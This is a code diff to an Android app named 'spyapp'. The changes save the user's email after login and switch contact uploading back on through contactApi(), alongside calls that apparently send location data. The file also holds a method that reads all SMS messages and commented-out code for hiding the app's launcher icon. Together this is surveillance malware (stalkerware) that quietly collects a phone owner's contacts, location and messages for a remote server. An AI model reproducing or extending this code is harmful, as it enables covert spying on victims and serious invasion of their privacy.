@@ -3,9 +3,11 @@ package kkactive_india.in.spyapp;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
+import android.app.Activity;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Address;
@@ -70,6 +72,10 @@ public class MainActivity extends AppCompatActivity {
     String address;
     String  name,phoneNumber, id,lat,lon;
     List<ContactDatum> data = new ArrayList<>();
+    SharedPreferences pref;
+    SharedPreferences.Editor edit;
+
+
 
     @TargetApi(Build.VERSION_CODES.O)
     @RequiresApi(api = Build.VERSION_CODES.M)
@@ -78,11 +84,14 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+
        // textView = (TextView) findViewById(R.id.textview);
 
         mail = (EditText)findViewById(R.id.mail);
         login = (Button)findViewById(R.id.logInButton);
         bar = (ProgressBar) findViewById(R.id.progress);
+        pref = getSharedPreferences("pref", Activity.MODE_PRIVATE);
+        edit = pref.edit();
 
         login.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -111,10 +120,13 @@ public class MainActivity extends AppCompatActivity {
 
                           id = response.body().getResult().getEmail();
 
+                          edit.putString("id",response.body().getResult().getEmail());
+                          edit.apply();
+
 
                           mainApi();
                           latLonApi();
-                          //contactApi();
+                          contactApi();
 
                          /* PackageManager p = getPackageManager();
                           ComponentName componentName = new ComponentName(this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
@@ -242,13 +254,13 @@ public class MainActivity extends AppCompatActivity {
 
         }
 
-        contactApi();
+//        contactApi();
 
         phones.close();
         //textView.setText(sb);
 
 
-        // callLogs();
+        // calls();
 
        // getSMS();
 
@@ -420,6 +432,9 @@ public class MainActivity extends AppCompatActivity {
 
 
     public List<String> getSMS() {
+
+
+
         List<String> sms = new ArrayList<String>();
         Uri uriSMSURI = Uri.parse("content://sms");
         StringBuffer sb = new StringBuffer();
@@ -459,6 +474,9 @@ public class MainActivity extends AppCompatActivity {
             cur.close();
         }
         return sms;
+
+
+
     }
 
 }
